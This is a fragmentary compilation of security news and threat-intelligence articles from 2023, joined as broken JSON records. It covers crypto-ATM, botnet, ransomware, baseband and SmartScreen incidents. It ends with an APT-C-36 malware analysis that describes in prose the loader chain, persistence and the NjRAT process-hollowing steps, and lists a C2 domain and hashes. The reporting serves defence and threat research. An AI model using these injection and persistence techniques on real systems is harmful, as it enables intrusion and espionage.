suppliers that have a track record of rapidly deploying updates, Miracco adds.Krishna Vishnubhotla, vice president of product strategy at Zimperium, says vulnerabilities like these highlight the need for enterprises to evaluate their mobile security strategies. \"It makes sense for enterprises to guide their employees on how to stay safe and if there are new requirements for enterprise access,\" he notes.With so much original equipment manufacturer (OEM) fragmentation in the Android space, the patches might only be available after a few months for all the vulnerabilities discovered. \"This is why it's important for enterprises to invest in security that can handle zero-day threats and can be updated over the air,\" Vishnubhotta adds.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Customers can deploy their ATMs using standalone management servers or General Bytes cloud service.Over the weekend, the company disclosed that hackers exploited a zero-day vulnerability tracked as BATM-4780 to remotely uploaded a Java application via ATM's master service interface and run it with 'batm' user privileges.\"The attacker scanned the Digital Ocean cloud hosting IP address space and identified running CAS services on ports 7741, including the General Bytes Cloud service and other GB ATM operators running their servers on Digital Ocean (our recommended cloud hosting provider),\" General Bytes explained in a security incident disclosure.The company took to Twitter to urge customers to \"take immediate action\" and install the latest updates to protect their servers and funds from attackers.After uploading the Java application, the threat actors gained able to perform the following actions on compromised devices:Ability to access the database.Ability to read and decrypt API keys used to access funds in hot wallets and exchanges.Send funds from hot wallets.Download user names, their password hashes and turn off 2FA.Ability to access terminal event logs and scan for any instance where customers scanned private keys at the ATM. Older versions of ATM software were logging this information.General Bytes warned that its customers and its own cloud service were breached during the attacks.While the Bitcoin wallet still contains the stolen cryptocurrency, the threat actors appear to have used Uniswap to convert the stolen Ethereum into USDT.CAS (Crypto Application Server) admins are urged to examine their \"master.log\" and \"admin.log\" log files for any suspicious gaps in time caused by the attacker deleting log entries to conceal their actions on the device.General Byte's report also warned that the uploaded malicious JAVA applications would appear in the \"/batm/app/admin/standalone/deployments/\" folder as random-named .war and .war.deployed files, as shown below.The company notes that the file names are likely different per victim.Those without signs of a breach should still consider all their CAS passwords and API keys compromised and immediately invalidate them and generate new ones. All user passwords should also be reset.Detailed step-by-step instructions for all server operators on protecting their endpoints are enclosed in the company's statement.General Bytes says they are shuttering its cloud service, stating it finds it \"theoretically (and practically) impossible\" to secure it from bad actors when it must simultaneously provide access to multiple operators.The company will provide support with data migration to those who would like to install their own standalone CAS, which should now be placed behind a firewall and VPN.General Byte has also released a CAS security fix that addresses the exploited vulnerability, provided in two patches, 20221118.48 and 20230120.44.It also highlights that the breached system underwent multiple security audits since 2021, but none identified the exploited vulnerability.The company says its plans to conduct numerous security audits of its products by multiple companies in a short period to discover and fix other potential flaws before bad actors find them."

      "title": "Mirai Hackers Use Golang to Create a Bigger, Badder DDoS Botnet",
      "text": " Former Mirai hackers have developed a new botnet, dubbed HinataBot, with the potential to cause far greater damage with far fewer resources required from its operators than its predecessor.To gauge the relative strength of HinataBot the Akamai researchers ran 10-second test attacks. \"If the botnet contained just 1,000 nodes,\" they found, \"the resulting UDP flood would weigh in at around 336 Gbps per second.\" In other words, with less than 1% of the resources, HinataBot was already capable of producing traffic approaching Mirai's most vicious attacks.When they considered what HinataBot could do with 10,000 nodes — roughly 6.9% of the size of peak Mirai — the resulting traffic topped out at more than 3.3 Tbit/s, many times stronger than any Mirai attack.\"These theorized capabilities obviously don't take into account the different kinds of servers that would be participating, their respective bandwidth and hardware capabilities, etc.,\" Akamai researchers warned in the report, \"but you get the picture. Let's hope that the HinataBot authors move onto new hobbies before we have to deal with their botnet at any real scale.\"Much of the reason for HinataBot's improvements comes down to how it was written.\"Most malware has traditionally been written in C++ and C,\" explains Allen West, one of the principal researchers of the report. Mirai, for example, was written in C.In more recent years, though, hackers have become more creative. \"They're trying to take any new approach they can, and these new languages — such as Go, with its efficiencies and the way it stores strings — makes it more difficult for people to deal with.\"\"Go\" — short for \"Golang\" — is the high-level programming language underpinning HinataBot. It's similar to C, but, in some ways, it's more powerful. With Golang, explains Chad Seaman, another author of the report, hackers \"get better error handling, they get memory management, they get easy threaded worker pools, and a little bit more of a stable platform that provides some of the speed and performance you would associate with a C-level language, and C or C++ binaries, with a lot of things that they don't have to manage.\"\"It just lowers the bar on technical difficulty,\" he says, \"while also raising the performance bar over, say, some of the other traditional languages.\"As scary as HinataBot may be, there may be a bright side.HinataBot isn't simply more efficient than Mirai — it must be more efficient because it's working with less.\"The vulnerabilities through which it's spread are not new or novel,\" Seaman says. HinataBot leverages weaknesses and CVEs already known to the security community and utilized by other botnets. It's an environment quite different than that of which Mirai operated in circa 2016–'17, when IoT vulnerabilities were novel and security for the devices was not top of mind.\"I don't think we're going to see a case of another Mirai, unless they get creative in how they're distributing and their infection techniques,” Seaman says. \"We're not going to see another 70,000 or 100,000-node, Mirai-like threat from the Hinata authors under their current tactics, techniques, and procedures.\"A less optimistic observer might note that, being only a couple of months old now, there is plenty of time for HinataBot to improve upon its limited weaknesses. \"It may just be an introductory phase, right?\" Seaman points out. \"They're grabbing at low hanging fruit so far, without needing to go out and do anything really novel yet.\"Nobody can yet say how big this botnet will become, or in what ways it'll change over time. For now, we can only prepare for what we know — that this is a very powerful tool, operating over known channels and exploiting known vulnerabilities.\"There's nothing that they're doing within the traffic that's circumventing security controls we've already put in place,\" notes Larry Cashdollar, the third author of the report. \"The exploits are old. There are no zero days. So, as it stands, the fundamental security principles for defending against this kind of threat\" — strong password policies, dutiful patching, and so on — \"are the same. They're still sufficient.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Black Basta, Killnet, LockBit groups targeting healthcare in force | SC Media",
      "text": "   A blog post issued by Microsoft on March 17 provides greater detail on the scope of Killnet DDoS campaigns over the last three months. Researchers analyzed the DDoS attack landscape deployed against healthcare apps hosted in Azure between Nov. 18, 2022, and Feb. 17, 2023, and found the attempts spiked from 10-to-20 attacks in November to 40 to 60 daily attacks in February.“DDoS attacks on healthcare organizations didn’t demonstrate severely high throughput,” researchers wrote. Several observed attacks hit 5 million packets per second (pps), but the majority of attacks fell below 2M pps.Pharmaceuticals and life sciences industries were the primary targets (at 31% of attacks), followed by hospitals (26%), and health insurance, health service, and care at 16% each. “These attacks, although not extremely high, could take down a website” without proper DDoS security protection,” researchers explained.Web apps and intertwined TCP and UDP were the primary attack vectors. In several instances, the researchers observed seven-layer DDoS attacks “consuming many TCP connections and keeping them alive long enough trying to deplete memory state resources to render the application unavailable.” The attack method models previous attacks tied to Killnet. In another common attack method, the DDoS will attempt to “establish many new TCP connections over short intervals to hit CPU resources.”In contrast to overall DDoS attack trends for 2022, in which TCP was the most common attack vector, 53% of the attacks on healthcare were UDP floods, and TCP accounted for 44%, reflecting a different mixture of attack patterns used by adversaries on healthcare.HC3 is urging healthcare entities to review tactics and recommended mitigation measures aimed to shore-up defenses against the ongoing threat of Black Basta. First spotted in early 2022, the threat actors behind the variant are known for their use of double extortion tactics.“The threat group’s prolific targeting of at least 20 victims in its first two weeks of operation indicates that it is experienced in ransomware and has a steady source of initial access,” according to the alert. The group is also reluctant to recruit or advertise on dark web forums.As such, it’s believed the actors are “seasoned cybercriminals.”“Rather than rely on comprehensive spray-and-prey tactics, the elusive group takes various precautions and relies on a more targeted approach, calculatingly assessing its victims before compromise,” according to the alert. Black Basta “either excludes affiliates or only collaborates with a limited and trusted set of affiliates.”In its initial attacks, Black Basta worked to purchase credentials for access to specific network targets. The “cunning” operators will often use unique tactics to gain initial access, before spreading laterally, exfiltrating data and deploying ransomware.The exploits enabled the group to “cumulatively steal several gigabytes of data” tied to personal information of healthcare customers and employees.” In only a “short span of time, by remaining under the radar, Black Basta has conducted massive breaches in critical infrastructure across multiple countries.”Notably, the cross-platform ransomware “is only executed with administrator privileges on both Windows and Linux systems,” the alert noted. Once deployed, the ransomware hinders machine processes and “ultimately makes desktop files unusable before sending a ransom note to a victim.”The actors have successfully exploited specific health IT websites, they’ve also disrupted healthcare industry services, laboratory and pharmaceutical, and health plan entities.HC3 believes these attacks will continue to target unpatched critical vulnerabilities in the public health and healthcare systems, which could have “potentially life threatening” impacts to critical infrastructure.The alert contains a long list of relevant defensive measures, focused on multi-layered actions that can minimize exposures and potential ransomware impacts. These tactics are not specific to Black Basta’s custom tactics, but include effective measures noted by security researchers.The ransomware-as-a-service (RaaS) model is a continuation of previous LockBit versions and all have highly effective tactics that hinder the effectiveness of computer network defenses and mitigation.In one instance, LockBit 3.0 was observed accepting “additional arguments for specific operations in lateral movement and rebooting into Safe Mode.” its code is password protected and affiliates without access to this model will be unable to execute the ransomware.The CISA-FBI alert explains that the code protection helps evade detection and analysis, as the “code is un-executable and unreadable in its encrypted form.” The actors behind the variant are still gaining access through remote desktop protocols (RDPs), “drive-by compromise”, phishing attacks, abuse of valid accounts, and exploits of public-facing applications.Entities are urged to prioritize patch management or network segmentation of known, exploited vulnerabilities, in addition to training users how to recognize and report phishing attacks and enforcing “phishing-resistant” multi-factor authentication.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.Attack on the U.S. subsidiary of the Industrial & Commercial Bank of China disrupted Treasury trading in New York earlier this week.

      "text": " Solutions for:Complete protection for your devices, online privacy & identityCombines security, performance & privacy features in one appEnhanced protection with device performance boosterVulnerabilities found in the Exynos chipset allow Samsung, Vivo and Google smartphones to be remotely hacked if the owner’s phone number is known. How is this possible, and how to protect yourself?\nMarch 20, 2023\nSmartphones, tablets, and even cars with Samsung Exynos microprocessors are at risk of remote hacking. Bug hunters at Google Project Zero say you just need the victim’s phone number.A baseband radio processor (BRP) is the part of a smartphone, tablet, or other smart technology that handles wireless cellular communication in second to fifth-generation devices:The BRP usually doesn’t include Wi-Fi or Bluetooth functions.Once a dedicated chip, for more than a decade now it has been commonly integrated with the CPU. Nevertheless, the BRP has its own memory and a rather complex command system — in fact, it’s a full-fledged highly-specialized processor that actively exchanges data with the CPU and main memory.The BRP’s executable code is written into it by the vendor, and it’s effectively inaccessible to smartphone apps for analysis or modification. To the CPU, the BRP is a black box, but one with extensive access to the device’s main memory where user data is stored.Project Zero researchers discovered that Exynos BRPs incorrectly process various service signals that the user receives from the cellular network. Upon receiving a malformed message, the chip can either freeze or, worse, run a piece of code loaded through the malicious message. Eighteen such bugs relating to service signal mismanagement were found, though to discourage hackers not all of these were described in detail.Since the BRP handles all communication with the cellular network, malicious code can be used for a whole range of spying purposes: from tracking the victim’s geolocation to listening in on calls or stealing data from the smartphone memory. At the same time, because it’s a black box, the BRP is virtually impossible to diagnose or disinfect, except by reflashing.The chips affected by the vulnerabilities are Exynos 850, 980, 1080, 1280, 2200, Exynos Modem 5123, Exynos Modem 5300, and Exynos Auto T5123.Unfortunately, vendors don’t always disclose details about which chips are installed in which devices. Using publicly available data, it was possible to compile an incomplete list of devices that most likely use these chipsets. It includes the following models:The main way to protect yourself is by updating the BRP firmware, which usually occurs during a full firmware update of the smartphone. For instance, Google already released bug fixes for the Pixel 7 and 7 Pro as part of its March update. Unfortunately, the Pixel 6 and 6 Pro are still vulnerable at the time of posting. We recommend that Pixel owners install the latest firmware through their smartphone settings without delay.Samsung has also released code updates for the Exynos BRPs, but has yet to fix all the vulnerabilities. What’s more, the vendor of each particular device containing these chips must independently package these fixes into their new firmware. At the time of posting, such firmware for other vulnerable devices was not yet available. It goes without saying that you’ll need to install these updates as soon as they appear.Thriving ChatGPT black market, ransomware gangs take a new level of bad and more\nThriving ChatGPT black market, ransomware gangs take a new level of bad and more\nMarch 17, 2023\nFour handy ways to lock your screen on Windows and macOS.\nFour handy ways to lock your screen on Windows and macOS.\nNovember 10, 2023\nMistakes commonly found in almost every large organization.

The file was submitted from South Korea. The OneNote file asks survey participants to fill out a hangul word processor(.HWP) document (Personal Information Use Agreement) in order to receive recompense. To do this, the image contains a .hwp file icon and file name disguised as a download, and the user is encouraged to double-click it. The double-click triggers the execution of a malicious VBS file hidden behind the image, which then downloads additional malware from an external server.When the image is moved as shown below, the VBS file icon appears behind it, and the previously known exploitation method of OneNote is applied in the same way. At this time, the same VBS files are arranged in a row, which is to ensure that the VBS file is executed even if the victim presses any part of the file.When the script is executed, the obfuscated code is executed and additional files are downloaded from the address below. No additional downloads were made at the time of analysis.

      "text": "  On Feb. 13, MKS discovered it was the victim of a ransomware attack, which impacted business systems and delayed or disrupted the company’s ability to process orders, ship products and provide other services, according to comments made by CEO John Lee in a Feb. 28 earnings call.A footnote claims that the plaintiff is filing under the name “John Doe” based on California laws that allows the use of pseudonyms in cases involving healthcare information in order to protect their privacy and prevent harassment of a healthcare patient. The suit claims that by not adequately protecting that information, MKS Instruments violated data protection requirements in the California Confidentiality of Medical Information Act, the California Consumer Privacy Act and other state laws. It also claims that the company may have stored such data in an unencrypted state, allowing hackers to make off with usable information that could lead to identity theft, fraud and other threats for affected victims.The lawsuit is seeking unspecified monetary damages and payment of attorney fees resulting from the incident.“MKS had the resources necessary to protect and preserve confidentiality of Plaintiff’s and the Class’ medical information and personal information in their possession, but neglected to adequately implement data security measures as required by the CCPA and the CMIA, despite their obligation to do so,” the complaint states.The complaint cites a notification sent by MKS Instruments to the affected parties stating that the company was investigating the incident and could not rule out the possibility that personal data for employees and others may have been exfiltrated.What data may have actually been stolen is unknown at this time, but the universe of information potentially exposed is vast. Among the information listed by the company were names, contact information, addresses, government ID numbers, work login credentials and passwords, marital status, veteran status, nationality, immigration status, race, religious beliefs, education, employment history, dates of birth, gender, sexual orientation, bank account information, payment card information, compensation and equity, hours worked, information about disabilities, health and medical conditions, health insurance information, and children and emergency contacts.   The company reported it has taken on a variety of costs associated with the event, including hiring of third-party consulting services, forensic experts, restoration experts, legal counsel, and other information technology and accounting professional expenses, enhancements to our cybersecurity measures, costs to restore systems and access data, and employee-related expenses like increased overtime.Terry Dennehy, vice president and senior credit officer for Moody’s Investors Service, said the ransomware attack and fallout was “credit negative” for the business.“The financial ramifications, temporary manufacturing delays, and the class action lawsuit underscore the potential cascading impacts of any cyber incident and the need to bolster cybersecurity across the industry,” Dennehy said in a statement.The filing also noted that it’s possible additional lawsuits or government sanctions could arise as a result of the attack.“While we intend to vigorously defend this lawsuit, and any additional such lawsuits, in light of the inherent uncertainties involved in such proceedings, we may incur losses associated with any such proceedings,” the company stated.Tyson Benson, an intellectual property and cybersecurity attorney at ZF Group, told SC Media that despite the fact that the lawsuit is being led by a former employee, there are few specific allegations demonstrating direct negligence on the part of MKS Instruments. While ransomware attacks typically involve the exfiltration of sensitive data, the company's notice only said that such data may have been stolen. Meanwhile, the complaint doesn't offer any direct evidence that personal data was left unencrypted, and that claim appears to be an inference on the part of the plaintiff's lawyers based on MKS' notification letter.\"There's no specific facts that the complaint points to. This very well could be a situation where MKS had all their stuff exfiltrated: trade secrets, confidential information, personal data of all their employees — but we don't know that,\" said Benson. \"That's what discovery is for and that's what the argument would be ... but this is one of those [cases that] is lacking on specifics.\"A call to one of the law firms representing the plaintiffs, Cohelan, Khoury and Singer, was not returned by press time. A public relations firm representing MKS sent SC Media a statement saying “as a matter of policy, we don’t comment on pending litigation.”Derek is a senior editor and reporter at SC Media, where he has spent the past three years providing award-winning coverage of cybersecurity news across the public and private sectors.

      "text": "  Over a dozen zero-day bugs rooted in Samsung's Exynos chipsets and used in a bevy of devices ranging from Android handsets, wearables and in-car infotainment systems are vulnerable to attack, according to Google's Project Zero.The class of flaws are baseband remote code execution vulnerabilities and impact Samsung’s Exynos chipsets. The chipsets are tied to Samsung’s use of Wi-Fi calling and Voice-over-LTE (VoLTE) within the Android operating system. “With limited additional research and development, we believe that skilled attackers would be able to quickly create an operational exploit to compromise affected devices silently and remotely,” Google said.Affected devices include those running Exynos chipsets and include:Fourteen less severe vulnerabilities (CVE-2023-26072, CVE-2023-26073, CVE-2023-26074, CVE-2023-26075, CVE-2023-26076 and nine other vulnerabilities that are yet to be assigned CVE-IDs) require either a malicious mobile network operator or an attacker with local access to the device, Google said.Google advises; “until security updates are available, users who wish to protect themselves from the baseband remote code execution vulnerabilities in Samsung’s Exynos chipsets can turn off Wi-Fi calling and Voice-over-LTE (VoLTE) in their device settings. Turning off these settings will remove the exploitation risk of these vulnerabilities.”Google chose to publicly release limited details of eight of the 18 vulnerabilities on Thursday because Samsung exceeded Project Zero's standard 90-day disclosure deadline. \"The remaining ten vulnerabilities in this set have not yet hit their 90-day deadline, but will be publicly disclosed at that point if they are still unfixed,\" Google Said.Technical specifics of the flaws are being withheld by Google at this time out of concern detailed specifics could allow attackers could use the information in attacks against unpatched devices. \"With limited additional research and development, we believe that skilled attackers would be able to quickly create an operational exploit to compromise affected devices silently and remotely,\" Google wrote.Tom Spring is Editorial Director for SC Media and is based in Boston, MA.

      "text": "  Researchers at Google’s Threat Analysis Group have uncovered a zero-day vulnerability that allows an attacker to bypass security features in Microsoft's SmartScreen and deploy Magniber ransomware without triggering security warnings.However, Google found that ransomware attackers can successfully evade this detection by delivering MSI files with \"an invalid but specifically crafted Authenticode signature.\" This pushes SmartScreen to use the default setting for the file shdocvw.dll, which does not display a security warning.\"The malformed signature causes SmartScreen to return an error that results in bypassing the security warning dialog displayed to users when an untrusted file contains a Mark-of-the-Web, which indicates a potentially malicious file has been downloaded from the internet,\" the post noted. CISA added the vulnerability to its Known Exploitable Vulnerability Catalog on Tuesday.It’s not the first time a SmartScreen bypass has been used as a vehicle to deliver ransomware.Microsoft’s previous patches managed to close off certain specific pathways to causing this error, but Google researchers note that attackers can call out and trigger the same error in many different ways, generating the same effect and making it vulnerable to bypass. Each pathway represents “a potential opportunity for an attacker to return an error…which will fall to open and not display a security warning.”“This security bypass is an example of a larger trend Project Zero has highlighted previously: vendors often release narrow patches, creating an opportunity for attackers to iterate and discover new variants,” Google noted. “When patching a security issue, there is tension between a localized, reliable fix, and a potentially harder fix of the underlying root cause issue. Because the root cause behind the SmartScreen security bypass was not addressed, the attackers were able to quickly identify a different variant of the original bug.”  The number of users who could have been potentially been exposed numbers in the hundreds of thousands. TAG researchers say there were 100,000 observed downloads of malicious MSI Windows installer files since January alone.Google’s research did not provide details around the extent to which the latest bypass vulnerability may have been exploited in the wild. In response, a Microsoft spokesperson sent a statement to SC Media that did not address questions around exploitation.\"We released a fix on March 14 and customers who have applied the update are already protected. Microsoft Defender for Endpoint and Microsoft Defender antivirus also provide protections against Magniber ransomware,\" the spokesperson said.Kev Breen, director of cyber threat research at Immersive Labs, told SC Media that \"Mark-of-the-Web\" related vulnerabilities, including CVE-2023-24880, have been actively exploited in the wild and \"should be high on the list of things to patch.\"\"Macro based malware is still frequently seen as part of initial compromises and users have grown accustomed to the prompts protecting them from dangerous files. Protected View and Mark-of-the-Web should be part of your defense in depth strategy and not a single layer of protection,\" Breen said.Menghan Xiao is a cybersecurity reporter at SC Media, covering software supply chain security, workforce/business, and threat intelligence.

      "title": "New ‘HinataBot’ botnet could launch massive 3.3 Tbps DDoS attacks",
      "text": " A new malware botnet was discovered targeting Realtek SDK, Huawei routers, and Hadoop YARN servers to recruit devices into DDoS (distributed denial of service) swarm with the potential for massive attacks.The new botnet was discovered by researchers at Akamai at the start of the year, who caught it on their HTTP and SSH honeypots, seen exploiting old flaws such as CVE-2014-8361 and CVE-2017-17215.Akamai comments that HinataBot’s operators initially distributed Mirai binaries, while HinataBot first appeared in mid-January 2023. It seems to be based on Mirai and is a Go-based variant of the notorious strain.After capturing multiple samples from active campaigns as recently as March 2023, Akamai’s researchers deduced that the malware is under active development, featuring functional improvements and anti-analysis additions.The malware is distributed by brute-forcing SSH endpoints or using infection scripts and RCE payloads for known vulnerabilities.After infecting devices, the malware will quietly run, waiting for commands to execute from the command and control server.Akamai's analysts created a C2 of their own and interacted with simulated infections to stage HinataBot for DDoS attacks to observe the malware in action and infer its attack capabilities.Older versions of HinataBot supported HTTP, UDP, ICMP, and TCP floods, but the newer variants only feature the first two. However, even with only two attack modes, the botnet can potentially perform very powerful distributed denial of service attacks.While the HTTP and UDP attack commands differ, they both create a worker pool of 512 workers (processes) that send hardcoded data packets to the targets for a defined duration.The HTTP packet size ranges between 484 and 589 bytes. The UDP packets generated by HinataBot are particularly large (65,549 bytes) and consist of null bytes capable of overwhelming the target with a large traffic volume.HTTP floods generate large volumes of website requests, while UDP flood sends large volumes of garbage traffic to the target; hence the two methods attempt to achieve an outage using a different approach.Akamai benchmarked the botnet in 10-second attacks for both HTTP and UDP, and in the HTTP attack, the malware generated 20,430 requests for a total size of 3.4 MB. The UDP flood generated 6,733 packages totaling 421 MB of data.The researchers estimated that with 1,000 nodes, the UDP flood could generate roughly 336 Gbps, while at 10,000 nodes, the attack data volume would reach 3.3 Tbps.In the case of the HTTP flood, 1,000 ensnared devices would generate 2,000,000 requests per second, while 10,000 nodes would take that number of 20,400,000 rps and 27 Gbps.HinataBot is still in development and might implement more exploits and widen its targeting scope anytime. Furthermore, the fact that its development is so active increases the likelihood of seeing more potent versions circulating in the wild soon.\"Let's hope that the HinataBot authors move onto new hobbies before we have to deal with their botnet at any real scale.\""

      "title": "APT-C-36: from NjRAT to LimeRAT",
      "text": " The threat intelligence division of S2 GrupoMarch 15, 2023This group’s campaigns during the last quarter are summarised in the following image.The diagram refers to the malware that is actually executed after the infection phase, i.e., after successful deployment of the first stages of the infection process. In fact, it is a successful deployment which will allow the malware to be executed, and which also allows the identification of TTPs prior to full compromise.  Going back to the previous image, the following should be noted:In this post we are going back to the December 5, 2022 campaign to explain in detail the deployment process of the malware in 5 stages observed until triggering NjRAT, considering this campaign as a case study. The objective is to show, by means of a simplified comparison, how the deployment for these RATs is very similar. In addition, It is provided a list of the IOCs of the previous campaigns, a summary of the behaviour in communications and a comparison of the adaptations/ modifications made in the last campaign that  triggers in LimeRAT.The following picture shows the file appearance once it is opened using Microsoft word.This group is characterised by the impersonation of official entities. As it can be seen, another of their characteristics is to keep a good level of appearance in the text and fake documents used in spear phishing campaigns.The document is revised to see which is the trigger of the infection, finding a suspicious  OLE object (Object Linking and Embedding) which in turn will lead to a WSF file (Windows Script File).The analysis is structured around the stages of the malware based on the previous resource. The following image shows the summary of the stages identified.The final purpose of the malware in this case is the deployment of the remote access trojan (RAT) NjRAT, but it is the way to such deployment that motivates the analysis which is described below; a set of procedures that are in fact been maintained with little variation through the rest of campaings until the date.Particularly, it should be noted that various stages of the malware deployment are produced entirely in memory, making detection by antivirus tools more challenging.This article will address the deployment chain in five stages, to then make a comparison between this operation and the last campaign in which LimeRat is deployed. In addition,  findings regarding the behaviour of the campaigns with respect to the communications model are included. Finally, the indicators of compromise of the different campaigns are summarised for possible consultation.As anticipated, in the 5th of december campaign, the malicious file contains an OLE object whose properties are investigated, inside a controlled environment. As can be seen, when the object is activated, it will produce the execution of a WSF file  (Windows Script File), Notificación Jurídica.wsf, and thus triggering the infection in the machine.Without further complication at this point, the files script can be extracted to do the analysis:The file has numerous repeated lines exactly the same to camouflage inside a piece of malicious code.Broadly speaking, in the WSF file, we can see the definition of a job in VBS language that, through powershell, will download a VBS file from the domain cdn.discordapp[.]com and then launch it via Explorer. The VBS script will later be deleted from the system. This file is analysed below.To carry on with the infection chain it is revised the VBS file downloaded, to which allusion is made with the Debug.vbs name, because of its later reference in the code. Indeed, at this point of the execution, this file can take any name, depending also on the campaign. The key issue here is that the script shows the appearance of a legitimate Microsoft WinRM file.However, after a detailed analysis the section which triggers the malicious logic can be seen.In fact, it can be seen that the code is obfuscated, although after some operations it is possible to extract the original code it executes:Specifically, an array of bytes in memory is declared to hold a PE file downloaded from the above IP after Base64 decoding. This file corresponds to a DLL (DLL.PPAM) and will be loaded into memory within the application domain of the current powershell process. Subsequently, the VAI method of the Fiber.Home class will be invoked by passing it as a parameter the URL written in reverse that can be seen at the end of the image. This will cause it to execute in a fileless way, making it more complicated to detect with antivirus tools.As it has been indicated, the first DLL injected in the powershell environment will be DLL.PPAM (Fiber.dll).Going into further detail,  DLL.PPAM is a .NET DLL with Yano protector (1.X).After reviewing the general properties of the DLL it can be observed the original name of the DLL: Fiber.dll.No obfuscation or similar action by the protector is appreciated.Fiber.dll checks if the file C:\\Windows\\Temp\\Debug.vbs exists on the computer. If so, Fiber.dll uses the name it was given in the previous step, to refer to it. If no such file exists, it copies the .vbs from the current path to the location mentioned under the name Debug.vbs. This file is the one that persists on the machine and the one that will be launched when the user session is started as seen in the persistence previously.It then performs a series of consecutive steps in an infinite loop to prepare and trigger the next stages of infection.In particular, it is observed that it downloads resources that will be used in the next phase of the infection. Once the download is done, it prepares the received data by reverting the obfuscated paths.Similar to the previous block, it also downloads the RAT that will eventually be deployed on the machine. In this case the URL downloaded it is received as a parameter when invoking the DLL with a simple obfuscation (reverse text). It also constructs a path that will be used later to pass the value  as a parameter in the next stage.The next step is to ensure persistence in a simple but functional way:As can be seen,  the persistence is done by creating a link in the user’s Startup folder, camouflaging itself under the guise of Notepad.Finally, it loads a payload (injector) obtained in the first download into the current application domain. Once the base64 encoding has been decoded, it invokes the “Ande” method of the “Tools” class of the “FSociety” module, passing as arguments the path previously constructed from the .NET path and the payload received from the second download, after decoding the base64 encoding as well.At this stage the malware is already operating with fileless files in memory. In this case, we focus on the second DLL that will be injected into powershell space, rump.dll (fsociety.dll).  The hashes that define this artefact are listed below:This is another unpacked .NET DLL with the same protector: Yano (1.X).After a static review of the binary, it shows that the import of functions clearly associated with process injection:The original name of this DLL is Fsociety.dll.The method used during the execution of the third phase will expect two parameters: This function will be used to trigger the whole process of launching and injecting the final payload (NjRAT).This binary, as we have seen above, imports functions associated with the injection/management of processes/sections/threads, etc. Therefore, since they are not implemented within the C# code, the malware must import them from external libraries (kernel32.dll). So, as a result, the following API functions are declared by the malware.The main functionality of this binary is to inject NjRAT using the Process Hollowing technique, as will be shown later.To describe and clarify the behavior of the malicious dll, the detailed steps performed by the malware until the injection becomes effective are shown below:1.- A legitimate suspended RegAsm.exe process is created by calling to CreateProcess:2.- The GetThreadContext is obtained from the Regasm.exe process previously created.3.- A call to ReadProcessMemory is made on RegAsm:This call reads 4 bytes from the PEB, specifically the IBA (Image Base Address) of the RegAsm process.Then, it compares the IBA of the binary to be injected, which has been previously obtained, with the IBA of the victim process extracted from the call to ReadProcessMemory. In case they are the same, it makes a call to NTUnMapViewOfSection to unlink the section of the process memory.4.- A new memory section is reserved with VirtualAllocEx to hold the final NjRAT payload.As can be seen, 64KB of memory has been reserved under address 0x400000 with read, write and execute (RWX) permissions.At this point of the execution, the content of this memory section remains empty.5.- A call is made to WriteProcessMemory on that section, to proceed to complete that memory area.Through this call, only the first 512B of the PE header have been written.Then, using the BlockCopy method of the C# Buffer class, another part of the PE is copied to another byte array that will be used later.And finally the content of this new intermediate array is copied to the reserved section in RegAsm.exe to complete the PE in memory.Analogously to the previous one (blockCopy + WriteProcessMemory) another part of the binary (1024Bytes) is copied to the memory of the RegAsm process.This set of BlockCopy + WriteProcessMemory calls will be carried out three more times until the total writing of the binary into memory is completed. In total, five BlockCopy + WriteProcessMemory interactions were necessary to write the file completely into memory. Possibly this is a measure to protect against AV detection in memory.6.- A call is made to SetThreadContext to set the new entry point to the thread.7. And finally a call to ResumeThread is made to restart the execution of the new thread.At this point of the execution, the RegAsm process stands out for its CPU consumption and observing the analysis of the generated traffic, the connection attempt against the C2 of NjRAT every 2 seconds stands out.Note: The IP 192.0.2.123 is a simulated IP and does not correspond to the real IP to which prueba30novok.duckdns.org would resolve.In case any of the previous calls (e.g. VirtualAllocEx)  fails to reserve memory in the victim process, the victim process will be terminated and the whole injection chain will be started again from step 1 (CreateProcess).A closer look on the RegAsm process shows that NjRAT is indeed loaded in its memory and it is possible to find its configuration parameters:Finally, once the debugging of the process is finished, it is observed that it does not depend on explorer, and the powershell process that was in charge of launching the dll injector finished its execution being correctly injected NjRAT in the RegAsm.exe process.As already mentioned, the objective of this publication was to get to this point, perhaps in the future we will delve into the analysis of NjRAT, something that is not addressed on this occasion so as not to detract from the publication.It should be noted that NjRAT has been triggered at this point, but the operation could be maintained to trigger other malware, and it is precisely in this operation where we wanted to keep the focus.In summary, all APT-C-36 campaigns detected during the last quarter are collected here in table form. The objective is to highlight the representative artifact type in each phase for the campaigns.Taking into account that the first stage deals with the hook of the attack (usually a file used for phishing with the camouflaged triggering device), we can simplify the comparison by referring to the most representative files of the rest of the stages. Althought for the different campaigns the .vbs file of the second phase has a different name, so far we have always identified a file with this extension that would be the protagonist in this stage, which would load fiber.dll and would be used for persistence. On the other hand, the DLLs of the third and fourth stage are kept as fiber.dll and fsociety.dll. The name of these DLLs changes for the deployment of LimeRAT, in which it should be noted that more obfuscation features are observed.This campaing starts with the file execution ‘DOCUMENTO (FGE).vbs’.md5 : 4cb86eadbadba68752d539597e6ab5adsha1 : 3e1682855ad4035134f6ebd68d56824535b4ca03sha256: b1b114c09344edc0be3459e3a93f47ef584df37b58500b7f420f8232e7cac6f5The image shows an obfuscation of the code to finally launch a powershell command:After some deofuscation operations, the code that will be executed is obtained:And after removing the other layer of obfuscation, you get to the code that powershell will finally run.The input method GzeUpA of the .NET module KZUTPv.WUGabK to be loaded into powershell memory is parsed.The same type of infinite loop is observed with a switch-case structure in which the program flow executes each and every one of the “cases” of the switch-case.In this case the persistence in the machine will be done by copying the VBS file to the startup folder.Additionally, a scheduled task will be created that will execute the previously created persistence file every minute.It has been disabled in order to continue with the analysis.Next, both the DLL injector and the final payload, in this case LimeRAT, are downloaded. The downloads and obfuscations are carried out in a similar way to the case study.Finally, it will 